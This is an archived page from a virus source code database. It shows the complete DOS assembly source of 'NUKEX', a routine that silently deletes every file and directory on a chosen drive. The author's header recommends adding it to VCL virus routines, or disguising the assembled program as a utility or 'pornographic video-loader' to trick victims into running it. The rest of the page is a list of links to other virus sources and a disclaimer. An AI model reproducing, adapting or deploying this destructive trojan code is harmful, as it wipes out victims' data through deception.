<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: nukex_asm</title>
<meta name="KEYWORDS" content="nukex.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for nukex.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="naktruth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/naktruth_asm.php">naktruth_asm</a><br>
<a href="narcosis_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/narcosis_asm.php">narcosis_asm</a><br>
<a href="natas_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/natas_asm.php">natas_asm</a><br>
<a href="nav_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nav_asm.php">nav_asm</a><br>
<a href="navigatr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/navigatr_asm.php">navigatr_asm</a><br>
<a href="navigtor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/navigtor_asm.php">navigtor_asm</a><br>
<a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/n/naziph2b_pas.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/n/naziph2b_pas.php'" tppabs="http://www.totallygeek.com/vscdb/n/naziph2b_pas.php">naziph2b_pas</a><br>
<a href="naziph2_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/naziph2_pas.php">naziph2_pas</a><br>
<a href="naziphob_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/naziphob_pas.php">naziphob_pas</a><br>
<a href="nd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nd_asm.php">nd_asm</a><br>
<a href="necro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/necro_asm.php">necro_asm</a><br>
<a href="ned09__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ned09__asm.php">ned09__asm</a><br>
<a href="ned09_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ned09_asm.php">ned09_asm</a><br>
<a href="ned_demo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ned_demo_asm.php">ned_demo_asm</a><br>
<a href="neuro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neuro_asm.php">neuro_asm</a><br>
<a href="neuroeng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neuroeng_asm.php">neuroeng_asm</a><br>
<a href="neverend_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neverend_asm.php">neverend_asm</a><br>
<a href="neverone_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neverone_asm.php">neverone_asm</a><br>
<a href="newc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newc_asm.php">newc_asm</a><br>
<a href="newtroi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newtroi_asm.php">newtroi_asm</a><br>
<a href="newvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newvir_asm.php">newvir_asm</a><br>
<a href="newzland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newzland_asm.php">newzland_asm</a><br>
<a href="newzlnd2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newzlnd2_asm.php">newzlnd2_asm</a><br>
<a href="newzlndb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newzlndb_asm.php">newzlndb_asm</a><br>
<a href="nhackerf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nhackerf_asm.php">nhackerf_asm</a><br>
<a href="nibbles_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nibbles_asm.php">nibbles_asm</a><br>
<a href="nina___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina___asm.php">nina___asm</a><br>
<a href="nina__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina__asm.php">nina__asm</a><br>
<a href="nina_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina_asm.php">nina_asm</a><br>
<a href="nina-d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina-d_asm.php">nina-d_asm</a><br>
<a href="ninja_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ninja_1_asm.php">ninja_1_asm</a><br>
<a href="ninja-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ninja-1_asm.php">ninja-1_asm</a><br>
<a href="ninja1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ninja1_asm.php">ninja1_asm</a><br>
<a href="nkpox11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nkpox11_asm.php">nkpox11_asm</a><br>
<a href="no_1_a_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/no_1_a_pas.php">no_1_a_pas</a><br>
<a href="no_1_b_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/no_1_b_pas.php">no_1_b_pas</a><br>
<a href="nobeaste_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nobeaste_asm.php">nobeaste_asm</a><br>
<a href="nobeastf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nobeastf_asm.php">nobeastf_asm</a><br>
<a href="noint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/noint_asm.php">noint_asm</a><br>
<a href="nomem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nomem_asm.php">nomem_asm</a><br>
<a href="nomncltr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nomncltr_asm.php">nomncltr_asm</a><br>
<a href="nont-512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nont-512_asm.php">nont-512_asm</a><br>
<a href="not_casc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/not_casc_asm.php">not_casc_asm</a><br>
<a href="notimp_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/notimp_asm.php">notimp_asm</a><br>
<a href="npox10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox10_asm.php">npox10_asm</a><br>
<a href="npox11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox11_asm.php">npox11_asm</a><br>
<a href="npox_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox_1_asm.php">npox_1_asm</a><br>
<a href="npox-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-1_asm.php">npox-1_asm</a><br>
<a href="npox21_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox21_asm.php">npox21_asm</a><br>
<a href="npox_v10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox_v10_asm.php">npox_v10_asm</a><br>
<a href="npox-v10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v10_asm.php">npox-v10_asm</a><br>
<a href="npox_v11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox_v11_asm.php">npox_v11_asm</a><br>
<a href="npox-v11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v11_asm.php">npox-v11_asm</a><br>
<a href="npox-v20_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v20_asm.php">npox-v20_asm</a><br>
<a href="npox-v21_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v21_asm.php">npox-v21_asm</a><br>
<a href="nrlg_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nrlg_asm.php">nrlg_asm</a><br>
<a href="nrlgsant_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nrlgsant_asm.php">nrlgsant_asm</a><br>
<a href="nukex_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nukex_asm.php">nukex_asm</a><br>
<a href="number1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number1_asm.php">number1_asm</a><br>
<a href="number1b_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number1b_pas.php">number1b_pas</a><br>
<a href="number_1_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number_1_pas.php">number_1_pas</a><br>
<a href="number1_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number1_pas.php">number1_pas</a><br>
<a href="number_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number_6_asm.php">number_6_asm</a><br>
<a href="number-6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number-6_asm.php">number-6_asm</a><br>
<a href="number6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number6_asm.php">number6_asm</a><br>
<a href="nymphmit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nymphmit_asm.php">nymphmit_asm</a><br>
<a href="nzeland2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nzeland2_asm.php">nzeland2_asm</a><br>
<a href="nzeland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nzeland_asm.php">nzeland_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;****************************************************************************
; NUKEX deletes the entire directory structure of a disk and all
; the files in its subdirectories and root. Add it to your VCL
; routines with the only variable   
; entered in 'nukit' as the string "x:\",0 where 'x' is the drive
; to be 'nuked.'[This example is set up to 'nuke' the structure of
; the A drive.]
;
; The NUKEX routine is derived heavily from Jeff Prosise's public
; domain utility 'NUKE' and for that, I thank him muchly.  As such, NUKEX
; is heavily cushioned with error handlers which will cause it
; to exit silently to DOS if any difficulty is encountered. However, 
; in most cases this will never occur.  NUKEX is fast, fast, fast, too,
; and presents the user with the somewhat unpalatable task of 'undeleting'
; hundreds, perhaps thousands, of files on a packed hard disk. 
; NUKEX also works perfectly as a standalone. Choose the drive, assemble,
; rename as a utility or pornographic video-loader, stand back and watch
; NUKEX do its stuff. --URNST KOUCH
;****************************************************************************

code            segment
                assume  cs:code,ds:code
                org     100h
begin:          jmp     main


nukit           db    "A:\",0            ;Drive to be treated with "nukex"
drive           db      ?                       ;Home drive
updir           db      "..",0                  ;Command to move up a level
filespec        db      "*.*",0                 ;File spec for searches
homedir db      "\",64 dup (?)                  ;Name of home directory
currdir db      "x:\",64 dup (?)                ;Name of current directory

main            proc    near
                cld                             ;Clear direction flag
                mov     si,offset nukit   ;Point SI to root of drive to nuke
                jmp     checkmem                
                                                ; Check if there's
checkmem:       cmp     sp,4000h                ; enough memory to run the
                ja      load                    ; program.

error:          mov     ax,4C01h                ; Exit if not enough memory.
                int     21h
;
; Set up the nukex run.
;
load:           jmp     prep                    ;Branch to prep
error1:         mov     ax,4C00h
                int     21h

; Save the current drive and directory.
;
prep:           push    si                      ;Save address
                mov     ah,19h                  ;Get default drive and
                int     21h                     ;  save it in DRIVE
                mov     drive,al
                mov     ah,47h                  ;Get current directory and
                sub     dl,dl                   ;  save it in HOMEDIR
                mov     si,offset homedir+1
                int     21h
                pop     si
;
; Go to the drive and directory entered in nukit.
;
                push    si
                mov     byte ptr [si],0         ;Convert to ASCIIZ
                pop     si                      ;Retrieve starting address
                cmp     byte ptr [si+1],":"     ;Branch if path does not
                jne     nodrive                 ;  contain a drive code

                mov     al,byte ptr [si+2]      ;Make sure a directory name
                cmp     al,20h                  ;  appears after the drive
                je      error1                  ;  code
                cmp     al,2Ch                  ; if there are any screw-ups,
                je      error1                  ; exit
                cmp     al,0
                je      error1

                lodsb                           ;Get drive code
                and     al,0DFh                 ;Capitalize it
                sub     al,41h                  ;Normalize it (0=A, 1=B...)
                mov     ah,0Eh                  ;Set default drive
                mov     dl,al
                int     21h
                mov     ah,19h                  ;See if it worked by seeing
                int     21h                     ;what is now the default
                inc     si                      ;Point SI to directory name

nodrive:        mov     ah,19h                  ;Get default drive and add
                int     21h                     ;it to CURRDIR for
                add     al,41h                  ;status messages
                mov     currdir,al
                mov     ah,3Bh                  ;Change directories
                mov     dx,si
                int     21h
                jnc     nukem                   ;Branch if the call succeeded
                mov     ah,0Eh                  ;Restore the default drive
                mov     dl,drive                ;and exit if it did not
                int     21h
                jmp     error
;
; Nuke everything now!
;
nukem:          call    nuke                    ;Nuke everything

                mov     ah,47h                  ;Get current directory
                sub     dl,dl
                mov     si,offset currdir+3
                int     21h
                mov     ah,3Bh                  ;Go up one level
                mov     dx,offset updir
                int     21h
                jc      root                    ;Branch if root directory

                mov     ah,3Ah                  ;Remove the final
                mov     dx,offset currdir       ;subdirectory
                int     21h
                jnc     showdir                 ;Branch if call succeeded
                                                ;Error if subdirectory cannot
                jmp     fatal_exit              ;not be removed

showdir:        nop                             ;Nonsense instruction: a lazy
                                                ;man's out.
root:           mov     ah,0Eh                  ;Restore default drive
                mov     dl,drive
                int     21h
                mov     ah,3Bh                  ;Restore current directory
                mov     dx,offset homedir
                int     21h

main_exit:      mov     ax,4C00h                ;Exit with ERRORLEVEL=0
                int     21h
main            endp


nuke            proc    near
                push    bp                      ;Save BP
                mov     ah,2Fh                  ;Get current DTA address
                int     21h
                push    bx                      ;Save it
                push    es
                sub     sp,2Bh                  ;Make room on the stack
                mov     bp,sp                   ;Establish addressability
                mov     ah,1Ah                  ;Set DTA address to a
                mov     dx,bp                   ;  location in the
                int     21h                     ;  stack
;
; Find the first file or subdirectory name.
;
                mov     ah,4Eh                  ;Call function 4Eh (DOS
                mov     cx,17h                  ;  Find First)
                mov     dx,offset filespec
                int     21h
                jnc     testname                ;Proceed if call succeeded
;
; Restore BP, the DTA, and the stack, then exit.
;
nuke_exit:      add     sp,2Bh                  ;Adjust the stack pointer
                mov     ah,1Ah                  ;Restore the DTA to where
                mov     bx,ds                   ;  it was on entry
                pop     ds
                pop     dx
                int     21h
                mov     ds,bx
                pop     bp                      ;Restore BP
                ret                             ;Return to caller
;
; Find another entry and decide what to do with it.
;
findnext:       mov     ah,4Fh                  ;Call function 4Fh (DOS
                int     21h                     ;  Find Next)
                jc      nuke_exit               ;Exit if nothing found

testname:       cmp     byte ptr [bp+30],2Eh    ;Skip . and .. entries
                je      findnext
                test    byte ptr [bp+21],10h    ;Branch if name returned is
                jnz     rmdir                   ;  a subdirectory name
;
; Delete the file whose name was just returned.
;
                mov     ax,4301h                ;Remove any existing file
                sub     cx,cx                   ;  attributes with a call
                mov     dx,bp                   ;  to DOS function 43h
                add     dx,30
                int     21h
                jc      fatal_exit              ;Exit if call failed

                mov     ah,41h                  ;Delete the file
                mov     dx,bp
                add     dx,30
                int     21h
                jc      fatal_exit              ;Exit if call failed
                jmp     findnext                ;Loop back for more
;
; Clear out and remove the subdirectory whose name was just returned.
;
rmdir:          mov     ah,3Bh                  ;Change to the subdirectory
                mov     dx,bp
                add     dx,30
                int     21h

                call    nuke                    ;Clear it out

                mov     ah,47h                  ;Get current directory
                sub     dl,dl
                mov     si,offset currdir+3
                int     21h
                mov     ah,3Bh                  ;Go up a directory level
                mov     dx,offset updir
                int     21h
                mov     ah,3Ah                  ;Remove the subdirectory
                mov     dx,bp
                add     dx,30
                int     21h
                                                ;Exit on error
                jc      fatal_exit

                jmp     findnext                ;Loop back for more
;
; A fatal error occurred.  Terminate.
;
fatal_exit:     mov     bx,dx                   ;Save DX in BX

                jmp     short fatal2            ;  and exit

             

fatal2:         mov     ah,0Eh                  ;Restore default drive
                mov     dl,drive
                int     21h
                mov     ah,3Bh                  ;Restore current directory
                mov     dx,offset homedir
                int     21h
                mov     ax,4C01h                ;Exit with ERRORLEVEL=1
                int     21h
nuke            endp


code            ends
                end     begin

</textarea></td></tr></table></body></html>
